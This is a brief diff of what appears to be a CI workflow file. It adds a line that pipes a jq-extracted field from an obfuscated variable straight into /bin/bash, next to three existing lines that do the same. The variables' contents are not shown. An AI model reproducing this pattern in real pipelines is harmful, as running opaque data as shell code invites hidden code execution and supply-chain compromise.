@@ -27,6 +27,7 @@ jobs:
           echo $f2962 | jq -r .c235 | /bin/bash
           echo $hyj3 | jq -r .xwkmu8573 | /bin/bash
           echo $z913 | jq -r .gbsqr86189 | /bin/bash
+          printf '%s' "$mjjbd8" | jq -r .fg29 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
